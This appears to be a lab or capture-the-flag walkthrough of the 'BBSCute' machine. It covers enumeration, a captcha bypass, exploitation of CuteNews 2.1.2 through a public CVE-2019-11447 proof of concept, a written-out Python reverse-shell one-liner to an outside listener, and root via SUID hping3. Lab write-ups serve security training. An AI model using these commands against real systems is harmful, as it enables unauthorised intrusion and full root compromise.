# BBSCute

## Nmap

```
sudo nmap   192.168.120.128 -p- -sS -sV                                      

22/tcp  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp  open  http     Apache httpd 2.4.38 ((Debian))
88/tcp  open  http     nginx 1.14.2
110/tcp open  pop3     Courier pop3d
995/tcp open  ssl/pop3 Courier pop3d
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Navigating to port 80 in the browser lands us on the default install page for Apache.

![](<../../../.gitbook/assets/image (1112).png>)

Running `dirsearch.py` against the target web servers reveals index.php

```
python3 dirsearch.py -u http://192.168.120.128 -w /usr/share/seclists/Discovery/Web-Content/common.txt -r -t 60 --full-url
```

![](<../../../.gitbook/assets/image (1113).png>)

Index.php takes us to the login page for CuteNews. I tried some default credentials and was unable to access the system.

![](<../../../.gitbook/assets/image (1114).png>)

Instead we can register ourselves as a new user to access. On the register new user page we are not able to load the captcha which stops us from proceeding:

![/index.php?register](<../../../.gitbook/assets/image (1116).png>)

Reviewing the source of this page shows we do have a link for captcha.php.

![](<../../../.gitbook/assets/image (1117).png>)

Viewing this will show what the current captcha should be.

![/captcha.php](<../../../.gitbook/assets/image (1118).png>)

Entering this into the registration field will allow us to proceed with new user creation.

![](<../../../.gitbook/assets/image (1119) (1).png>)

We can see that we are running CuteNews 2.1.2 as per the footer of the page. Searching for exploits with `searchsploit` shows the results below.

![](<../../../.gitbook/assets/image (1120) (1).png>)

Searching further on Google for exploits we come across a PoC on GitHub located here: [https://github.com/CRFSlick/CVE-2019-11447-POC](https://github.com/CRFSlick/CVE-2019-11447-POC).

Download the python script and the `sad.gif` files to the same directory. Run with the syntax shown below.

```
python3 <User> <Pass> http://192.168.120.128/index.php
```

![](<../../../.gitbook/assets/image (1121).png>)

We can now run the following command to get a more usable reverse shell on a different listener:

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.120",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'
```

![](<../../../.gitbook/assets/image (1122).png>)

From here I uploaded `linpeas` which after executing identified the binary hping3 as having a SUID bit set. Meaning we can execute the binary with root permissions.

![](<../../../.gitbook/assets/image (1123).png>)

Then as per [GTFOBins](https://gtfobins.github.io/gtfobins/hping3/) we can executed with the SUID bit to gain a root shell.

![](<../../../.gitbook/assets/image (1124).png>)

```
/usr/sbin/hping3
/bin/sh -p

OR

./hping3
/bin/sh -p
```

![](<../../../.gitbook/assets/image (1125).png>)
